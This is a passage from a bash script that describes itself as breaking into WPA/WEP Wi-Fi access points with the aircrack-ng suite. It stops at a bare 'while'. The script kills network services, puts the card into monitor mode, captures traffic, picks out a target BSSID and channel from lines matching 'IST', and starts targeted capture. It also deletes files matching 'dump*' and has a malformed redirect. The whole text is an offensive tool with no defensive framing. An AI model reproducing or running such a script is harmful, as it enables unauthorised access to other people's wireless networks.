#!/bin/bash
#Script breaks into WPA-WEP Wi-Fi AP's
#Written By Matthew Santalla using Aircrack-ng

echo Please wait, attempting to crack...
iwconfig 2>/dev/null 1>/dev/null
airmon-ng check kill
rfkill=`rfkill list |grep "Wireless" | awk '{print substr($1,0,1)}'`
rfkill unblock $rfkill
airmon-ng start wlan0 1>/dev/null 2/dev/null
rm dump*
airodump-ng wlan0mon -w dump 2>/dev/null & 
sleep 6; pkill -9 airodump-ng 1>/dev/null 2>/dev/null
channel=`grep "IST" dump-01.csv | awk '{print substr($6,0,2)}'`
bssid=`grep "IST" dump-01.csv | awk '{print substr($1,0,17)}'`
echo Attempt to Crack Network ID: $bssid on Channel: $channel
airodump-ng -c $channel --bssid $bssid wlan0mon 2>>compare &
while 